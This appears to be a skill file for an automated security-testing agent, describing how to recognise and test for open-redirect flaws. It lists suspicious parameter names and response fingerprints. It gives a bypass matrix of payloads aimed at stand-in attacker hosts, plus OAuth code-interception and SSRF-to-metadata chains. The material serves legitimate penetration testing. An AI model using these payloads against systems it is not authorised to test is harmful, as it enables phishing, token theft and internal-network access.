# open-redirect

## Dispatch when

- **A request parameter whose value is, or contains, a URL or path.** Names to watch: `next`, `redirect`, `redir`, `url`, `u`, `r`, `return`, `returnUrl`/`ReturnUrl`, `returnTo`, `continue`, `goto`, `go`, `dest`, `destination`, `target`, `back`, `to`, `out`, `callback`, `forward`, `image_url`, `file` (when URL-shaped). The single strongest tell is a parameter value that already holds a `/path`, a `//host`, or a full `scheme://host`.
- **A 3xx response with a `Location:` header that echoes your input.** Send `?next=/foo` and get `302` + `Location: /foo` (or `Location: https://target/foo`) → the redirect target is user-driven. This is the core fingerprint.
- **A `Location:` value that flips to your host with an absolute URL.** `?next=https://example.org` yields `Location: https://example.org` → confirmed open redirect. If it 302s back to the app instead, you are in allowlist-bypass territory (still this skill).
- **Login / logout / SSO flows carrying a "where to go after" parameter.** `?next=` on a login form, `?service=`, `RelayState=`, `redirect_uri=`, `post_logout_redirect_uri=`. OAuth/OIDC `redirect_uri` is the highest-impact variant; `post_logout_redirect_uri` is consistently the weakest-validated.
- **Meta refresh or client-side navigation seeded from input.** HTML containing `<meta http-equiv="refresh" content="0;url=USERINPUT">`, or JS `location.href = param` / `router.push(searchParams.get('next'))` → client-side open redirect.
- **Generic redirector endpoints in the path.** `/out`, `/r/`, `/redirect`, `/link`, `/away`, `/exit`, `/go`, `/cgi-bin/redirect.cgi` → these redirect by design and frequently skip scheme checks.
- **Email/verification/invite/unsubscribe links with a tracking-style URL parameter.**
- **URL shorteners, "share", and outbound-link handlers** — they exist to redirect and routinely lack scheme/protocol checks.
- **A partial block that smells like substring matching.** `?next=https://evil.com` rejected but `?next=https://target.com.evil.com` or `?next=//evil.com` slips through → naive validator; run the bypass matrix below.
- **Reverse proxy / gateway header-driven redirects.** When absolute-URL construction depends on `Host` / `X-Forwarded-Host` / `X-Forwarded-Proto`, or the stack honors `X-Original-URL` / `X-Rewrite-URL`, the redirect target can be steered via headers rather than a visible query param.
- **Multi-hop chains.** Any flow where one redirect leads to another and only the first hop is validated (trusted → internal redirector → external). The second hop is where the escape happens.

## Key recognition tells (request → response)

- **Naive open redirect (smoking gun):** `GET /login?next=https://attacker.example/` → `302` + `Location: https://attacker.example/`. Capture the first-hop `Location`, not the final 200.
- **Protocol-relative bypass** (defeats a `startsWith("/")` check): `?next=//attacker.example` → `Location: //attacker.example`; browser treats it as cross-origin. Variants: `/\attacker.example`, `\/\/attacker.example`.
- **Userinfo trick** (defeats host-parsing validators): `?redirect=https://target.example@attacker.example` → validator parses host as `target.example` and allows it, but the browser navigates to `attacker.example`. Variant: `https://target.example%40attacker.example`.
- **Substring allowlist bypass:** `?url=https://target.example.attacker.com` or `?url=https://attacker.com/?x=target.example` returns a `Location:` with your host while plain `https://attacker.com` is rejected → the check is `contains("target.example")`.
- **Double-encoding differential:** `?next=%2f%2fattacker.example` then `?next=%252f%252fattacker.example`. Validator sees one string; the emitted `Location` decodes to `//attacker.example`. Edge-decodes-once, origin-decodes-again is the signature.
- **Scheme smuggling / lenient parsers:** `?next=https;/attacker.example`, `?next=http:attacker.example`, `?next=hTtPs://attacker.example` reaching the `Location` header means the parser is lenient.
- **Client-side only (no `Location` header):** first response is `200` (not 3xx) but the body contains `<meta http-equiv="refresh" content="0;url=ATTACKER">` or inline `location = "ATTACKER"`. A different parser executes the navigation, so it has different bypasses.
- **OAuth code interception setup:** `redirect_uri=https://trusted.example/out?url=https://attacker.tld/cb` → IdP accepts it (host is `trusted.example`), then the app's own `/out` redirector forwards the `code`/token to `attacker.tld`.

## Key techniques

- Always read the **first-hop** `Location` header, not the final landing page.
- Run the bypass matrix against any partial/naive validator: protocol-relative (`//`, `/\`, `\/\/`), userinfo `@` (raw and `%40`), substring-allowlist (`target.example.attacker.com`, `attacker.com/?x=target.example`), single vs double URL-encoding, scheme smuggling (`https;/`, `http:`, mixed case), and IDN/Unicode host confusables.
- For OAuth/OIDC/SAML, even with a registered allowlist: test whether arbitrary subpaths/query-strings on the registered host are accepted, and whether an open redirect *on* the registered host can chain to bounce the authorization `code`/token to you.
- For multi-hop flows, supply a target that escapes on the second (unvalidated) hop.
- Chain with SSRF: when a server-side fetcher (link unfurler, URL previewer, webhook validator, screenshot/PDF service, "import from URL") follows 3xx, an open redirect on an allowlisted domain defeats an SSRF destination allowlist (bounce `allowed-host → 169.254.169.254`). Dispatch alongside SSRF testing whenever a fetcher follows redirects.
- For header-driven redirects, steer the target with `Host` / `X-Forwarded-Host` / `X-Forwarded-Proto` / `X-Original-URL` / `X-Rewrite-URL` instead of a query param.
- A `data:` / `javascript:`-scheme redirect *target* the browser executes is an open-redirect-to-XSS chain.

## When NOT to use / easily confused with

- **Reflected value lands in HTML/JS but does not drive navigation → XSS, not open redirect.** (Overlap: a `data:`/`javascript:` redirect target that the browser executes is an open-redirect-to-XSS chain — only then does this skill apply to the script execution.)
- **A user-controlled URL the *server* fetches/acts on (not redirects to) → SSRF.** Open redirect steers the *client's* navigation (or chains a fetcher's 3xx-follow). If the server fetches the URL itself and you never see a 3xx aimed at you, route to SSRF; use this skill alongside SSRF only when the open redirect is the chaining primitive.
- **A redirect confined to same-origin relative paths with robust normalization → not exploitable.** If every variant (`//`, `\`, `@`, encoded, IDN) is rejected or normalized to a local path and `Location` is always same-origin, do not flag.
- **Strictly pre-registered OAuth `redirect_uri` with exact-match verification → not this skill**, unless you find arbitrary-subpath/query acceptance or an open redirect on the registered host to chain.
- **Path traversal / LFI parameters that look URL-ish (`?file=../../etc/passwd`) → path traversal/LFI.** Tell: filesystem access vs. an emitted `Location`/navigation.
- **CRLF in the redirect target that splits the response and injects headers → HTTP response splitting / header injection** (distinct, often co-located). Open redirect is the destination change; the header-injection skill owns the `\r\n` smuggling.
- **A redirect that always shows an interstitial with the exact final destination before navigating → low/no impact**; treat as a false positive unless the interstitial itself is bypassable.
